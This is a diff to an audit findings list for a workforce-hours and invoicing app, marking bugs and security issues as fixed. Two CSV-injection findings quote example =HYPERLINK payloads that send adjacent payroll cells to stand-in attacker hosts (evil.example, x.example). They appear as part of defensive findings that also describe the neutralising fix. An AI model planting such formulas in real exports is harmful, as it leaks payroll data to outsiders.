@@ -501,7 +501,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Add invoice dialog keeps the period from the week it first loaded on after the week changes, so period and per-day lines disagree
 
-`apps/web/src/app/hours/AddInvoiceDialog.tsx:39` · correctness · Confirmed 3/3
+`apps/web/src/app/hours/AddInvoiceDialog.tsx:39` · correctness · Confirmed 3/3 · **Fixed (W3-06):** `<AddInvoiceDialog key={data.week}>` remounts the dialog with the week on screen.
 
 - **Problem:** Open /hours (W41), click the previous-week arrow (W40), click 'Add invoice', pick Apex, enter hours and save. sub_invoices is stored with period Oct 5–11 (W41) and lines dated Sep 28–Oct 2 (W40). W40 shows the company as 'awaiting' (the period doesn't overlap). W41 shows a full false gap, because the invoice lines don't match any W41 day.
 - **Fix:** The suggested fix works. `key={data.week}` (plus siteId if it should also reset) on <AddInvoiceDialog> in hours/Page.tsx:246 remounts the dialog when the week's data arrives. Resetting the form each time the dialog opens, from the current matrix, also works and covers all cases. Optionally disable 'Add invoice' while `hours.isPlaceholderData` is true, so the dialog can't be opened against the previous week's matrix during the fetch.
@@ -737,7 +737,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Payroll CSV does not neutralise spreadsheet formulas in company/site/trade names
 
-`supabase/functions/api-export-payroll/csv.ts:51` · input validation / CSV injection · Confirmed 3/3
+`supabase/functions/api-export-payroll/csv.ts:51` · input validation / CSV injection · Confirmed 3/3 · **Fixed (W3-06):** `csvCell` (`packages/shared/src/report/payroll.ts`) prefixes a text cell that starts with `=`, `+`, `-`, `@`, tab or CR with `'`, numbers stay plain; api-export-payroll's `csvEscape` and the demo CSV use it (Deno tests in `csv_test.ts`, unit tests in `payroll.test.ts`).
 
 - **Problem:** An ops user, or a reporter answering the unknown-company question, adds a company named =HYPERLINK("https://evil.example/?d="&B2&C2,"Delta Electric"). The accounts user downloads payroll_2026-W41.csv and opens it in Excel. The cell renders as a link 'Delta Electric', and clicking it sends the neighbouring site/project cells to the attacker. Older Excel builds also allow DDE payloads.
 - **Fix:** The suggested fix is right. Apply it only to string inputs, so that numeric cells like workers and version stay plain numbers. In csvEscape, after the null check, set `let s = String(value); if (typeof value === 'string' && /^[=+\-@\t\r]/.test(s)) s = "'" + s;`, then apply the existing RFC 4180 quoting to s. Add Deno tests for `=HYPERLINK(...)`, `+1`, `-1` and `@SUM(...)`, and one checking that a value like `Delta, Inc` is still only quoted.
@@ -828,7 +828,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### No 'invoice_gap' panel notification is ever produced
 
-`supabase/functions/_shared/notify.ts:9` · notifications / §13 · Confirmed 3/3
+`supabase/functions/_shared/notify.ts:9` · notifications / §13 · Confirmed 3/3 · **Fixed (W3-06):** `20261016000270_invoice_gap_notice.sql`: `invoice_gap_check()` posts one org-wide `invoice_gap` notice (audience admin, ops, accounts by `notification_audience`) per invoice and gap under spec §19 Q133's default (`INVOICE_GAP_POLICY`), from the invoice save (trigger on `sub_invoices`) and from a report version that changes the hours behind it (deferred trigger on `reports`); `sub_invoices.gap_notified` keys it, `invoice.gap_notified` audits it (`supabase/db-tests/src/invoice-gap.test.ts`).
 
 - **Problem:** An accounts user records BrightLine invoice BL-3381 for 212 h against 196 h reported. No bell notification is created for anyone, and the accounts user only sees the gap by opening /hours and the right week.
 - **Fix:** The suggested fix's direction is right, but notify_org cannot target roles. Its p_user_id is one user or null, and null means every org member sees it (notifications_select RLS, 20261011000004_rls.sql:169). So "targeted at ops+accounts" means looping `select user_id from org_members where org_id = NEW.org_id and role in ('ops','accounts')` and calling notify_org once per user. The alternative is to accept a single org-wide notification (p_user_id null). 1. Add a SECURITY DEFINER AFTER INSERT OR UPDATE OF total_hours, lines, period_start, period_end, company_id trigger on sub_invoices. 2. Skip the notification when NEW.status = 'resolved'. 3. Compute the gap with the same expression as invoi…
@@ -870,14 +870,14 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Crew hours for accounts users links to report pages they cannot open
 
-`apps/web/src/app/hours/Page.tsx:385` · role-gating · Confirmed 3/3
+`apps/web/src/app/hours/Page.tsx:385` · role-gating · Confirmed 3/3 · **Fixed (W3-06):** still open before; `GapCell` gates the Confirm link on route access (reports, else glossary) and shows an accounts user a plain hint; the evidence chips were gated already.
 
 - **Problem:** An accounts user sees an UNCONFIRMED company, clicks 'Confirm' and lands on the No-access page with no way to act.
 - **Fix:** The suggested fix is fine, but gate on route access instead of hardcoding the role string. In GapCell and InvoiceCheckAside, get `role` from useAuth() and compute `const canOpenReports = canAccess(role, ROUTE_ROLES.reports)` (both from '@/auth/guards'). When this is false, render 'UNCONFIRMED' / 'Confirm' as plain text with a title or hint such as "Ask an ops user to confirm this company". Render the evidence audio/report chip as a non-link span that still shows the report number. Also stop the '/glossary' fallback in GapCell (Page.tsx:385) for these users, because glossary is also blocked for accounts (guards.tsx:36). Put the new hint text in apps/web/src/copy/en.ts.
 
 ### Invoice upload path uses the raw file name: non-ASCII or '#', '%', '[' names fail or store under a different key
 
-`apps/web/src/data/supabase/SupabaseSource.ts:1246` · storage · Confirmed 3/3
+`apps/web/src/data/supabase/SupabaseSource.ts:1246` · storage · Confirmed 3/3 · **Fixed (W3-06):** `invoiceUploadPath()` (`packages/shared/src/invoices.ts`): `{org}/{uuid}-{slug}.{ext}` in safe characters only, in the panel and the demo.
 
 - **Problem:** An accounts user attaches 'Rechnung_März.pdf' or 'Invoice [Oct].pdf' in Add invoice. The upload fails with 'Invalid key', addInvoice throws and the invoice row is never inserted. With 'Invoice #4471.pdf' the upload goes to '.../1728...-Invoice ' while the DB stores '.../1728...-Invoice #4471.pdf', a path that does not exist.
 - **Fix:** The suggested fix is correct. Build the key only from safe characters, for example `${this.orgId}/${crypto.randomUUID()}.pdf`, or the original name slugified with name.normalize('NFKD').replace(/[^A-Za-z0-9._-]+/g, '_'). Keep `${orgId}/` as the first folder so the 'members upload invoices' RLS policy still matches. If the original name should be shown in the UI, store it separately, either in a column or via upload's `metadata` option. Using up.data.path instead of the local string would not help, because storage-js returns the same unencoded input path.
@@ -912,7 +912,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### Payroll CSV does not neutralise spreadsheet formulas in company and site names
 
-`supabase/functions/api-export-payroll/csv.ts:51` · security/csv · Confirmed 3/3
+`supabase/functions/api-export-payroll/csv.ts:51` · security/csv · Confirmed 3/3 · **Fixed (W3-06):** `csvCell` (`packages/shared/src/report/payroll.ts`) prefixes a text cell that starts with `=`, `+`, `-`, `@`, tab or CR with `'`, numbers stay plain; api-export-payroll's `csvEscape` and the demo CSV use it (Deno tests in `csv_test.ts`, unit tests in `payroll.test.ts`).
 
 - **Problem:** An unknown company is captured as '=HYPERLINK("https://x.example/?"&A2,"Pay")'. The accounts user opens payroll_2026-W41.csv in Excel and the cell renders as a live formula or link built from adjacent payroll data.
 - **Fix:** The suggested fix is right. Apply it only to string inputs, so that numeric cells like workers and version stay plain numbers. In csvEscape, after the null check, set `let s = String(value); if (typeof value === 'string' && /^[=+\-@\t\r]/.test(s)) s = "'" + s;`, then apply the existing RFC 4180 quoting to s. Add Deno tests for `=HYPERLINK(...)`, `+1`, `-1` and `@SUM(...)`, and one checking that a value like `Delta, Inc` is still only quoted.
@@ -1010,7 +1010,7 @@ Fix the critical and high items before real customer data (other organisations, 
 
 ### invoice_gaps compares each invoice with reported hours for the query window, not the invoice's own period, and repeats the company total for every invoice
 
-`supabase/migrations/20261011000005_rpcs.sql:307` · wrong-result · Unverified
+`supabase/migrations/20261011000005_rpcs.sql:307` · wrong-result · Unverified · **Fixed (W3-06):** `20261016000270_invoice_gap_notice.sql` compares each invoice with the reports of its own period (a lateral sum over `current_manpower`).
 
 - **Problem:** Reproduced on PGlite. Adding a second Apex invoice for Oct 8–9 (24 h) to the seed makes invoice_gaps(org, '2026-10-05','2026-10-09') return Apex twice: gap 0 for the weekly invoice and gap −448 for the two-day one. A one-day query invoice_gaps(org,'2026-10-09','2026-10-09') reports Apex +368 h and Ironclad +184 h, because the whole weekly invoice is compared with one day of reports.
 - **Fix:** Compute reported hours per invoice: `left join lateral (select sum(hours) from current_manpower cm where cm.company_id = i.company_id and cm.date between i.period_start and i.period_end) r on true`.
